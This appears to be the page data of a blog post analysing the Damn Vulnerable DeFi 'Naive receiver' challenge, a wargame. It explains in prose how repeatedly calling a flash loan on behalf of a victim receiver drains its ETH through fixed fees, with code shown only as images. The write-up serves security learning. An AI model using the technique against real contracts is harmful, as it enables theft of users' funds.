{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/defi-wargame-2/",
    "result": {"data":{"cur":{"id":"cab25208-c5af-55d1-9a24-d2f1bec3dba1","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChElEQVQoz1WRS28SUQCF7zCvO0OnwPAqM8DMnQGmU0ppKQxQaIEAFZAWJC1qtC22ttU0GuvCR0yMiTHRJr7ixo07F250YdRoE6Mb3dTEZ2JMNEYXJi79A8Zg3Zh8ObvvLM4BV1an2pmshdd7rP2cTedsusUedvRFeVfE0TfMuyI2Z8TmHORdEbs7arUP9BvTC+dvTa6cU0odIIua0xbAKdlESSZKxkg/xaqCL+4WYz6U8qGkxzvq8cZFyZDUtOCPRxL11pELjWOX9JnjAPurERCRjEJARDEKCREJEQFlzqqLUkJS05Ka9qOkEsxISloJZiLJaaPaCeT2ApxRSEsYpwKA9OPmEMD9gJS6aRIB7u2CiSay206zKgkRhgkERASjsBYN6Olma+lkqXIwmmzmmquTtaXczsX8jk6h2E5lGmPju8qVfeGhIgERAB4IZWOkREAJpxHTEwTKSLW1f71SW46NtXJTi/nyfLGxXKwupDKNmFHzyoYaylodgywX1JBRq659efNdQhPAJHBWHYh6IV1bSEy0I/F6aGwWaWUj0x5N1odjJY8vbiIlDBMBJriExKcHT7buvXv59Pfayk0TLdNsAFj8aV4rO6R8rzPRq5btQtYZyPsCEw7nAE7LBFQoVsVp2cwPzS1tbFx8fOPqq9Prt/uEJCB94ND8qRNHL8/U10Ulb9crIiq4taKsFa12neWCOI2680BEsarbOx4d3p3LdozRNm+PmZko+Pns/a8X3z7cfXt47qw3VLQ4Rhiun+FCFKuQzD9zm+0LOXPc37tnyHYmxV8HW3c2vz56/WPz8/1rDzUlBwgvAWWclnH4n0lAhNOItYTCvgOzgeeL2semtPkHwct/h8g9dMIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"truster-contract\"\n        title=\"truster-contract\"\n        src=\"/static/ea95c093885303179aba6f59ce840dd2/37523/c2.png\"\n        srcset=\"/static/ea95c093885303179aba6f59ce840dd2/e9ff0/c2.png 180w,\n/static/ea95c093885303179aba6f59ce840dd2/f21e7/c2.png 360w,\n/static/ea95c093885303179aba6f59ce840dd2/37523/c2.png 720w,\n/static/ea95c093885303179aba6f59ce840dd2/e996b/c2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #2 — Naive receiver</p>\n</blockquote>\n<p>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\nDrain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>NaiveReceiverLenderPool.sol</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 121.1111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAIAAAB1KUohAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD00lEQVQ4y1XS647bRBiAYV9KN0k39tjjOY/Hdjwn2zk0u5vsgdZpKaV/QLCLgJWQkuUKuAAugrtEk6RFSK/87/E3/sbRb5//WeqfVvqXZfO40o9vTGhtn7b9rw/L54fl8/3i9xv/tGkft+3Ttn287R7v+qeN//Hn3V/RbX8Yv6Lg9SyZVMmkjkdlPFKXFzIZKzApj6nphYwvZDwS8UgkIwHG8vIVccV9dLf4M4WW4CXKepIsUdLlsYNTBy9tPrUoDuHE4cSSL1HgcDxb1O+jh8ULGzcl6YzsKupL6mrWVqydibbhvqJeYcdSi2KNj5FEU2DyaTWvhuhh+ZJfzjjqCt5z2nLSimOKdwXvWN6iWJ9lEmTAiUHTalEHfIjjGuMFJnMCO0LnOO/yxKHMY+gJ9AFPGxQ3AccNSTQDBsUnvNjHE0XZgpCepp7SHsMWpw5PDU4NmjY41jS1LHUUWJZaCgLGcbWsh+ib5QGMlUQLkneMzRnpKe25mDPUctZx3ArU8tTxLHw5h46m5oxnQ/R2dUhGZZX0Rd7xcsVJTzKLU0ugDQORY9DhuDkeODxponlqcFKtmiF6tzqASUmBD1cCbDgwMKFEk8zQ1FBoGbQstxxagRzPrcgsiY94WB/SsVIgLJbSjrOeYc9oK3LPaUdJx1nLsefYC+wlawX1Egb8Rg/Rbn2ILwqKe1EuhVrIeiWQl2pRq0VB50IuS2ILZBQyRW4ZaDjQIjUUVGs9RO/Xh2RckMxR6GjuCfIss+Go2DFoZK5LbCU0ChsJDU81T7WEhiZ1wB+u9slIsryVbF6wLiyMrDhZ1sQ1wje8rYibcTdjruGuok5kZ3xlhujD9R6MJCedqlak2JDynlR3rNpK1HFgROZ4eh7IMy2OycwwUF/bIfr2eg/GkgJLM1vVq8aslZw3qju+XrO0OUnxn9RFHvCNGaKPN3swkSy1grRF0QviaDxjScNSzU4D/y8lDJif8HebfTqRIvPstKTwAwXGgObgNLYRaXP81HMqbK6+cSc8luEOeSdSy4Gh0PHMcGjEcc8SW4nseeYxlQe8cUP0abvPXksBXV32puxtMVdq1cjOzPpZ3RfIKt4q5r/KItclMuKEv9/u4aUqoOegEaeDZfr0V8isEamWWSOz5qtUJ5zVWz9En7d7NFUKdwq1Re6POZEZkZkCmiIPqVPIlMcqbAs4u2t30afNH8lrKrmXxDFqODOCWZHNcFySpCSJoomiQLEv8VSJrMQxv9J30csPfy9nb9d696YZ1jp0pYdruzu1caGtP3fb7u7a3X27u/Xvnj++/AvGx0nn5EDjjQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"NaiveReceiverLenderPool.sol\"\n        title=\"NaiveReceiverLenderPool.sol\"\n        src=\"/static/db9a462e9f3520cc5e357d74bfbe794b/37523/c2-1.png\"\n        srcset=\"/static/db9a462e9f3520cc5e357d74bfbe794b/e9ff0/c2-1.png 180w,\n/static/db9a462e9f3520cc5e357d74bfbe794b/f21e7/c2-1.png 360w,\n/static/db9a462e9f3520cc5e357d74bfbe794b/37523/c2-1.png 720w,\n/static/db9a462e9f3520cc5e357d74bfbe794b/e996b/c2-1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>We are using the Address contract of the openzeppelin library as a dependency.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">uint256 private constant FIXED_FEE</code></p>\n<ul>\n<li>It is assigned a value of <code class=\"language-text\">1 ether</code> and has a constant variable characteristic, so it cannot be modified as a fixed value at <code class=\"language-text\">compile-time</code>, and it is <code class=\"language-text\">private</code> and cannot be accessed from outside.</li>\n</ul>\n<blockquote>\n<p>You can define <code class=\"language-text\">constant, immutable </code>as <code class=\"language-text\">State Variables</code>. Both variables cannot modify their values after they are constructed. <code class=\"language-text\">constant variables</code> cannot be tampered with because they are fixed at <code class=\"language-text\">compile-time.</code> immutable variables are still assignable at construction-time.</p>\n</blockquote>\n<h3 id=\"funcitons\" style=\"position:relative;\"><a href=\"#funcitons\" aria-label=\"funcitons permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Funcitons</h3>\n<p><code class=\"language-text\">function fixedFee() external pure returns (uint256)</code></p>\n<p>You can see that the State Variable value is returned as it is without modifying the state value. Used for checking the FIXED_FEE value.</p>\n<p><code class=\"language-text\">function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant</code></p>\n<p>Execute the flash loan logic, which is a core function in the current contract.</p>\n<ul>\n<li>The local variable <code class=\"language-text\">balanceBefore</code> is assigned the current contract balance value.</li>\n</ul>\n<p>✅ The <code class=\"language-text\">balanceBefore</code> value must be greater than or equal to the parameter <code class=\"language-text\">borrowAmount</code>, and the balance of the current contract must be higher than the borrowing price to be able to borrow.</p>\n<p>✅ The parameter <code class=\"language-text\">borrower</code> is assigned an address type. Under the current condition, call the <code class=\"language-text\">isContract</code> function of the openzeppelin internal address contract to measure the size of the target address to measure whether the contract is activated.</p>\n<p>The isContract function has the following characteristics.</p>\n<ol>\n<li>It is not safe to assume that the address for which this function returns false is an External Owner Account, not a contract.</li>\n<li>relies on extcodesize returning 0 for the contract being created because the code is only saved when the constructor execution ends</li>\n<li>extcodesize returns 0 if called in the contract constructor</li>\n<li>If you are using this in a security-sensitive setup, you should consider if it’s a problem.</li>\n</ol>\n<ul>\n<li>Call the <code class=\"language-text\">functionCallWithValue</code> method with the parameter borrower. In the low-level stage, the <code class=\"language-text\">receiveEther(uint256)</code> method of the target contract FlashLoanReceiver is called and used as the <code class=\"language-text\">FIXED_FEE</code> parameter and <code class=\"language-text\">borrowAmount</code> vlaue value.</li>\n</ul>\n<p>✅ After the flash loan logic is completed, it is checked whether the current contract’s balance value is greater than or equal to the <code class=\"language-text\">balanceBefore+FIXED_FEE</code> value to determine whether the progress has been made normally.</p>\n<blockquote>\n<p>FlashLoanReceiver.sol</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 94.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAAsTAAALEwEAmpwYAAADKElEQVQ4y13P227cRBzHcT8IEuymWXvGa895xoe1Z+zxYY9Jc1inCSAoDS03XKDdVEjcoG6RescT8Bo8H5pNSqRKX/nKH/3+4/3+y7+v1h9uN3/drg93G9d3Z4fvzw8/XHx8s/10P3x6ffXx9eXhp6vDm6vD/fXh5+sPb4fD/fWff7z7xztvHsZf4WCcTkZqMlL+SPljdfqN8EcyPE2nkzQYS3/E/TEPRi4w5vBETL7GRr70ztv30C9I1OOwJbBHoEFBHfvVMYN8g0FFoCHAUGhoaFhoeFgRMOvzV97L7iEEMxo3JKoItBgYFGgM3a8EGgw0Ckp8jICnWKhRkHXZ4F21D+gkF7FNmRW4EqiSccWnJsG1whWB2knwLCl0GAdZnw3eRfcAooKKBUsWgvdMzAlpCWpQoGO/xP6zpEdJYckfcT54F+0enKaM9s5ENUWWkYaEBk8KHBRfbLpZWPKpJiCb54N32e7BJOViznnP1ZzLnrGGEctZw+P6C+YKS/GIZ4N31e3Bi5TilkbWMdZgoDHUONQUaOIXFBRPOHTxz3gxG7zr+X56kiawodOKoJrFluGak1oSy3ElmRWReRzkn5ORpiBbFoO3ne/hWEncKtnxZEH4QrJGMlskNpd2pmxOaxZq/rTpchhmy3Lwbub74ESSqGbUuqfyhlMrYkNww6JaRJqBwh0Mn5dVpBnMVg4v9+BEMmQFbYRoU2Ql7jDpJbZSNEnaKmZzagpuZswUzJSiSnHFYLYuB+92uYNjybGVvBHcSmbd2bxLcM2iUsRGRFpGWsWlissk1glyXx5mGzN4t+td+EIKYinrCV8q2UnZJGmnSM3AjMOCh8Xja2XkUpHDIsw2evDuVrt4kqhpzSLD4lqgSiAjSCVRJWIjkVGx/p8dZZkiLabZmRm8b9c75KcF7hLaJKo91qWyTUWTMptymxGrYq0ifbxZp0hnyMgoP69vvLvVb2DCGa14XFJUMKQ51iIsSJASkDGQUZgxmPHQJY7JKKdArsoLb/fj3za5nGdDl2/7bNvn23m+XRTbRTEsi2FVutZ6WJthc+zMDOfVzZm5/vXu/X8uqQjcgsSPCgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"FlashLoanReceiver\"\n        title=\"FlashLoanReceiver\"\n        src=\"/static/f088a895657d623eae9c1e3781a974e7/37523/c2-2.png\"\n        srcset=\"/static/f088a895657d623eae9c1e3781a974e7/e9ff0/c2-2.png 180w,\n/static/f088a895657d623eae9c1e3781a974e7/f21e7/c2-2.png 360w,\n/static/f088a895657d623eae9c1e3781a974e7/37523/c2-2.png 720w,\n/static/f088a895657d623eae9c1e3781a974e7/e996b/c2-2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"dependency-1\" style=\"position:relative;\"><a href=\"#dependency-1\" aria-label=\"dependency 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>I am using the Address contract of the openzeppelin library as a dependency.</li>\n<li>You can use various functions related to Address Type.</li>\n</ul>\n<h3 id=\"state-variable-1\" style=\"position:relative;\"><a href=\"#state-variable-1\" aria-label=\"state variable 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">address payable private pool</code></p>\n<ul>\n<li>This is the contract address used for pool management in the flash loan process.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address payable poolAddress)</code></p>\n<ul>\n<li>When creating a distribution, it is possible to assign a contract address to the State Variable pool according to the value of the parameter.</li>\n</ul>\n<p><code class=\"language-text\">function receiveEther(uint256 fee) pulibc payable</code></p>\n<p>✅ The address value of the <code class=\"language-text\">msg.sender</code> address and the pool variable must be the same, and you can confirm that the Sender is the contract address assigned to the pool variable.</p>\n<ul>\n<li>After adding the parameter <code class=\"language-text\">fee value and msg.value value</code>, it is assigned to the <code class=\"language-text\">amountToBeRepaid</code> variable.</li>\n<li>The value assigned to the fee is <code class=\"language-text\">1 ether</code>, which is the fixed fee value assigned in the <code class=\"language-text\">NaiveReceiverLenderPool</code> contract. Even if the <code class=\"language-text\">msg.value</code> value changes, you can see that the fee value is fixed.</li>\n</ul>\n<p>✅ The current contract’s balance value must be greater than or equal to the <code class=\"language-text\">amountToBeRepaid</code> value to pass the condition, and the borrow amount value must not be greater than the balance in the holding pool.</p>\n<ul>\n<li>Call the meaningless <code class=\"language-text\">_executeActionDuringFlashLoan()</code> function. (gas waste)</li>\n<li>Use the openzeppelin library Address contract method <code class=\"language-text\">sendValue</code> to send the loan return to the <code class=\"language-text\">NaiveReceiverLenderPool</code> contract.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>Vulnerable targets cause problems in the logic of flash Loan. Because the flashLoan function can be called externally, there is no way to reject a large number of incoming loans by calling the Receiver with this address. By providing the address you choose to pass on to the borrower to accept the flashLoan, you can do a fee and charge a flash Loan, which can ruin that Receiver’s pool.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>In the current state, the externally callable Flash Loan is called. At this time, since the <code class=\"language-text\">FIXED_FEE</code> value is fixedly 1 Ether, there is no need to specify the loan amount, and 10 calls are made according to the target amount of 10 Ether to exhaust the balance value of the target contract.\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 134.44444444444446%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAbCAIAAADzvTiPAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEaklEQVQ4y03TSY7bRhSAYd7E7gESpxpejayiOA9FkWrJktojYnuRRTZxK06WCdLxLgfINXLHgFI3HOBfEAQ/1IBH77cf/z0Of7we/rof/nyzfurd9Ph+8/jD9tunV98+zA+PHy/tHj/vHj/vHz/ufv/6+R9vU56CF9wPVsGt9X0bBZYGxr/Wty/k8kotr9TiSi6f86+kfy2DG7l4SS1M3q76lfkl52tBes4GDb1hHQ0b6tc0aIhf0ecgqCAoISh5UFE/q/TR2zS/hGEmuVPQaGg4tILWsCjkshRhjRYFWhZkLid+Ti8FBV6mpTp4U/WAXhpJHBGO0I5BR2kfxy6kI6VO04b45Yz9ZxzkEBbkO75JFXbAe857RlogLSYupiOGSZNm/vR5TQguzbhSB29bnZYLk+ptTkYbuxRGTZ1YlDwsKWpi1DPUgp/j/20b/JwsbaUP3rY+La+0CjtOegbztmXc6rBh0GK2xnSgdJC4slBoUhqoFC4M6zWpa733ds3Jv0qU33DcMumAtUAajhoV1RxaCgOGNWWDYt1KVIWuLSszuc6k68zxCUNQ46CkQcnCiqOaxSULS4gqCEsaFjQsaVCwMBNxzqNcxSWPssYczvg6sVGfyLsMRsk3Nt2vkjvF1oJPQHuKW4oaA91KOMM6HuYszKhv2+Tg7btTcK056QzuBW0JtAj3mDhKXYIaSnrCR8GcgF7LsTJTodeGtXDBhzNmvE9wo4MC8IwpDEA6QgcBHYcGaEdh4NBZaBSuFCohSDtzxuFNYlAr+Sip06gzelOku0yNmZqEmqQYFDgqJ51sDK01rjSqWJh29uAd+1N4o01QGzYoPgDu5glnzpDGkJYyx8GJ8+QVyZhLV+jBQgOB7ezeO/YPwY1i0Oq4knHJaE1wS0lLoNeo5rgB2nLWKzq/TLjLVV8lYyZblx68+/4LXlqOah4WLCogLiAqIa4YqmRUclRxVAlcS1QKXGlSGVIZWiuUu3Tv3bsvyLcr1ipUmrBKosriZt7CMuXBSjzHg5UMVyLKRJSpOGehHdK992Z4iG6Vxc2KdUYPJfS1cFbPPwkXA5NjwnrNXSKHRI+a1irONC5ElM747foUL7TAzUqtjd2mZrJm3RZTmU3M7lSyTZI7me7y8rCyG41yhfLkgld77+14ApJJ5oD0nHaS1Ox8czIqRFTIOFdxLuJCxIVE+bzsGcs4HWe8/kICk+BaBrkKcxUXMsxEOJ9NPqeiTJ3X1CjXOE/IM363foj9JDfrAroUWsM6QRpOG03meZCklrRW5+t9kjg3F5ztvffTA7pVieyNHrV2krWMtIx1ijYJrjg0knUaWo2yi5wxLlScTtne+zA94KVO1ZDK0Zoxt5vU3mm7Le3dPAzZ1qp1Es/nNKQweM7SUqPVJj9476afaaAlKimuJNSW1QnUkjWW1ymvU9EonIsolfFTCqUar3iYDOmd9/XT36155dJ7Zw/9OWcPQ/q9cXWY8uOlTXG8K47b4n6T7396/fAfIuV2uZb+/lkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"solve code\"\n        title=\"solve code\"\n        src=\"/static/d57dc5076e1d79ea370aefc3d4620d76/37523/c2-3.png\"\n        srcset=\"/static/d57dc5076e1d79ea370aefc3d4620d76/e9ff0/c2-3.png 180w,\n/static/d57dc5076e1d79ea370aefc3d4620d76/f21e7/c2-3.png 360w,\n/static/d57dc5076e1d79ea370aefc3d4620d76/37523/c2-3.png 720w,\n/static/d57dc5076e1d79ea370aefc3d4620d76/e996b/c2-3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>","excerpt":"Wargame Provider: @tinchoabbate Challenge #2 — Naive receiver There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\nDrain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;) Code Audit NaiveReceiverLenderPool.sol  Dependency We are using the Address contract of…","frontmatter":{"date":"July 29, 2022","title":"Damn Vulnerable DeFi Wargame Challenge2 — Naive receiver Contract Analysis","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-2/"}},"next":{"id":"290fa8aa-801e-5258-9c39-b020e9110881","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: 